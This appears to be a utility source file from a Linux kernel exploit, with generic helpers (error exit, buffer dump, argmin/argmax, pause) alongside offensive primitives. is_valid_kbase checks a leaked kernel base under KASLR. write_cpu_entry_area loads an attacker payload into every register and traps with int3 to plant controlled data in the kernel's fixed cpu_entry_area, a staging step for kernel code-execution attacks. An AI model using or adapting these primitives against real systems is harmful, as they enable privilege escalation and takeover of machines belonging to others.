#define _GNU_SOURCE

#include "util.h"

#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

#include "vars.h"

void fatal(const char *str) {
    perror(str);
    exit(1);
}

void dump_buffer(void *const buffer, const uint64_t row) {
    uint64_t *ptr = buffer;
    printf("[ ] buffer dump from %p\n", ptr);
    for (uint64_t i = 0; i < row; i++) {
        printf("      %p|+%#03lx: %#016lx\n", &ptr[i], i * 8, ptr[i]);
    }
}

bool is_valid_kbase(void) {
    if (!kaslr && kbase == default_kbase) {
        return true;
    }
    if (kaslr && ((kbase >> 32) == 0xffffffff && (kbase & 0xfffff) == 0 && default_kbase <= kbase &&
                  kbase <= 0xffffffffc0000000)) {
        return true;
    }
    return false;
}

uint64_t argmin_u64(const uint64_t *const array, const uint64_t len) {
    uint64_t index = 0;
    uint64_t min = UINT64_MAX;
    for (uint64_t i = 0; i < len; i++) {
        if (min > array[i]) {
            min = array[i];
            index = i;
        }
    }
    return index;
}

uint64_t argmax_u64(const uint64_t *const array, const uint64_t len) {
    uint64_t index = 0;
    uint64_t max = 0;
    for (uint64_t i = 0; i < len; i++) {
        if (max < array[i]) {
            max = array[i];
            index = i;
        }
    }
    return index;
}

static void sig_handler(int32_t s) {
    return;
}

void write_cpu_entry_area(char *payload) {
    puts("[ ] writing cpu_entry_area");
    if (CHECK(fork()) > 0) {
        sleep(1);
        return;
    }
    struct sigaction sa = {0};

    sa.sa_handler = sig_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;

    CHECK(sigaction(SIGTRAP, &sa, NULL));
    CHECK(sigaction(SIGSEGV, &sa, NULL));
    setsid();
    asm volatile(
        ".intel_syntax noprefix;"
        "mov rsp, %0;"
        "pop r15;"
        "pop r14;"
        "pop r13;"
        "pop r12;"
        "pop rbp;"
        "pop rbx;"
        "pop r11;"
        "pop r10;"
        "pop r9;"
        "pop r8;"
        "pop rax;"
        "pop rcx;"
        "pop rdx;"
        "pop rsi;"
        "pop rdi;"
        "int3;"
        ".att_syntax prefix;"
        :
        : "r"(payload)
        : "memory");
    __builtin_unreachable();
}

void stop_execution(char *str) {
    char *msg = "[ ] waiting for input...";
    if (str != NULL) {
        msg = str;
    }
    puts(msg);
    getchar();
}
